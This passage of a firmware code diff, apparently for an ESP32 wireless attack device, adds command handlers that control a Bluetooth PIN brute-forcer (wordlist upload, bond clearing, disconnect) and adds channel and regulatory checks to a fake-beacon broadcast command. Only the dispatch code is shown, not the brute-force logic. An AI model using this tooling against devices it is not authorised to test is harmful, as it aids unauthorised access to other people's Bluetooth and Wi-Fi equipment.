+        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_FORGET_BOND") == 0) {
+        String error;
+        bool ok = blePinBruteforce.forgetBond(error);
+        proto.sendResp(id, ok, ok ? "ble pin bond cleared" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_DISCONNECT") == 0) {
+        String error;
+        bool ok = blePinBruteforce.disconnectPeer(error);
+        proto.sendResp(id, ok, ok ? "ble pin disconnect requested" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_WORDLIST_RESET") == 0) {
+        String error;
+        bool ok = pinBruteforce.beginWordlistUpload(error);
+        proto.sendResp(id, ok, ok ? "ble pin wordlist upload ready" : error.c_str());
+    }
+
+    else if (strcmp(cmd, "BLE_PIN_WORDLIST_CHUNK") == 0) {
+        const char* b64data = doc["args"]["data"] | (const char*)nullptr;
+        bool last = doc["args"]["last"] | false;
+        uint32_t offset = doc["args"]["offset"] | 0;
+        uint32_t checksum = doc["args"]["checksum"] | 0;
+        if (!b64data) {
+            proto.sendResp(id, false, "missing data");
+            return;
+        }
+        size_t b64len = strlen(b64data);
+        size_t outCap = ((b64len + 3) / 4) * 3 + 2;
+        uint8_t* outBuf = (uint8_t*)heap_caps_malloc(outCap, MALLOC_CAP_8BIT);
+        if (!outBuf) {
+            proto.sendResp(id, false, "oom");
+            return;
+        }
+        size_t outLen = 0;
+        int ret = mbedtls_base64_decode(outBuf, outCap, &outLen,
+                                        (const unsigned char*)b64data, b64len);
+        String error;
+        bool ok = false;
+        if (ret == 0) {
+            ok = pinBruteforce.addWordlistChunk(outBuf, outLen, offset, checksum, last, error);
+        } else {
+            error = "decode failed";
+        }
+        heap_caps_free(outBuf);
+        proto.sendResp(id, ok, ok ? (last ? "ble pin wordlist saved" : "chunk ok") : error.c_str());
     }
     #endif
 
@@ -1330,19 +1965,6 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
     }
 
-    else if (strcmp(cmd, "PIN_RANGE_RESUME") == 0) {
-        String error;
-        if (!pinBruteforce.resume(error)) {
-            proto.sendResp(id, false, error.c_str());
-            return;
-        }
-        JsonDocument resp;
-        resp["ok"] = true;
-        pinBruteforce.status(resp);
-        String json; serializeJson(resp, json);
-        proto.sendRaw(TYPE_RESP, id, (const uint8_t*)json.c_str(), json.length());
-    }
-
     else if (strcmp(cmd, "PIN_RANGE_CLEAR") == 0) {
         bool clearWordlist = doc["args"]["wordlist"] | false;
         String error;
@@ -1371,6 +1993,8 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "PIN_WORDLIST_CHUNK") == 0) {
         const char* b64data = doc["args"]["data"] | (const char*)nullptr;
         bool last = doc["args"]["last"] | false;
+        uint32_t offset = doc["args"]["offset"] | 0;
+        uint32_t checksum = doc["args"]["checksum"] | 0;
         if (!b64data) {
             proto.sendResp(id, false, "missing data");
             return;
@@ -1388,7 +2012,7 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
         String error;
         bool ok = false;
         if (ret == 0) {
-            ok = pinBruteforce.addWordlistChunk(outBuf, outLen, last, error);
+            ok = pinBruteforce.addWordlistChunk(outBuf, outLen, offset, checksum, last, error);
         } else {
             error = "decode failed";
         }
@@ -1400,8 +2024,25 @@ void handleCmd(uint8_t id, JsonDocument& doc) {
     else if (strcmp(cmd, "START_BEACON") == 0) {
         radioIdle();  // stop sniff / portal / prior beacon before starting
 
+        const char* band = doc["args"]["band"] | "auto";
+        WifiBandMode bandMode = WifiBandMode::BAND_2G;
+        String bandError;
+        if (!configureWifiBand(band, bandMode, bandError)) {
+            proto.sendResp(id, false, bandError.c_str());
+            return;
+        }
+
         const char* ssidsRaw = doc["args"]["ssids"] | "";
         uint8_t  channel     = doc["args"]["channel"] | 1;
+        if (!isValidWifiChannel(channel)) {
+            proto.sendResp(id, false, "invalid channel");
+            return;
+        }
+        String regulatoryError;
+        if (!validateRegulatoryChannel(channel, regulatoryError)) {
+            proto.sendResp(id, false, regulatoryError.c_str());
+            return;
+        }
         uint16_t intervalMs  = doc["args"]["interval_ms"] | 20;
         bool randomize       = doc["args"]["random_bssid"] | true;
         bool hidden          = doc["args"]["hidden"] | false;
@@ -1510,6 +2151,7 @@ void setup() {
     // ★ FIXED: removed the redundant first AP config block.
     // The one and only WiFi.mode() call is right here.
     WiFi.mode(WIFI_MODE_APSTA);
+    applyStoredWifiCountry();
 
     // Configure a minimal hidden AP so WIFI_IF_AP is always valid for TX.
     wifi_config_t ap_cfg = {};
@@ -1563,6 +2205,7 @@ void setup() {
     #ifdef ENABLE_BLE_HID
         bleScanner.begin(proto);
         bleProfile.begin(proto);
+        blePinBruteforce.begin(proto);
     #endif
 
 }
@@ -1580,6 +2223,9 @@ void loop() {
     hiddenApDetector.update();
     mesh.update();
     pinBruteforce.update();
+    #ifdef ENABLE_BLE_HID
+        blePinBruteforce.update();
+    #endif
     ld2450.update();
     emitLd2450Events();
     #ifdef ENABLE_BLE_HID
